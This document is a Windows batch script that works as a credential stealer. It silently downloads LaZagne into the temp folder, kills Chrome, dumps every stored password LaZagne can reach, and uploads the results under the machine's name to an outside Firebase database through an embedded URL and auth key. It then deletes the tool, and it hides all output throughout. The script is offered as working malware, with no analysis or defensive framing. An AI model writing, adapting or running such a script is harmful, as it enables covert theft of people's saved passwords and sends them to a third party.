@echo off
setlocal enabledelayedexpansion
chcp 65001 >nul

:: CONFIG
set "LAZAGNE_URL=https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe"
set "LAZAGNE_EXE=%TEMP%\LaZagne.exe"
set "OUTPUT_DIR=%TEMP%\Lazagne_Results"
set "FIREBASE_URL=https://check-6c35e-default-rtdb.asia-southeast1.firebasedatabase.app/credentials"
set "FIREBASE_KEY=fdM9pHfanpouiqsEmFLJUDAC2LtXF7rUBXbIPDA4"

:: DOWNLOAD LAZAGNE
if not exist "%LAZAGNE_EXE%" (
    powershell -WindowStyle Hidden -Command ^
    "$ProgressPreference='SilentlyContinue'; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%LAZAGNE_URL%' -OutFile '%LAZAGNE_EXE%'" >nul 2>&1
)

:: KILL CHROME
tasklist | find /i "chrome.exe" >nul && taskkill /f /im chrome.exe >nul 2>&1

:: CREATE OUTPUT DIR
if not exist "%OUTPUT_DIR%" mkdir "%OUTPUT_DIR%" >nul 2>&1

:: RUN LAZAGNE
"%LAZAGNE_EXE%" all -oN -output "%OUTPUT_DIR%" >nul 2>&1

:: GET LATEST TXT FILE
set "RESULT_FILE="
for /f "delims=" %%F in ('dir /b /a-d /od "%OUTPUT_DIR%\*.txt" 2^>nul') do set "RESULT_FILE=%%F"

if not defined RESULT_FILE exit /b

:: UPLOAD TO FIREBASE
set "PC_NAME=%COMPUTERNAME%"
set "PC_NAME=!PC_NAME: =_!"
set "PC_NAME=!PC_NAME:-=_!"

powershell -WindowStyle Hidden -Command ^
"$content=Get-Content -Raw -Path '%OUTPUT_DIR%\%RESULT_FILE%';" ^
"$json=@{'computer'='%PC_NAME%';'timestamp'='%DATE% %TIME%';'data'=$content} | ConvertTo-Json -Compress;" ^
"Invoke-RestMethod -Uri '%FIREBASE_URL%/%PC_NAME%.json?auth=%FIREBASE_KEY%' -Method PUT -Body $json -ContentType 'application/json'" >nul 2>&1

:: CLEANUP
del /f /q "%LAZAGNE_EXE%" >nul 2>&1
exit /b 0
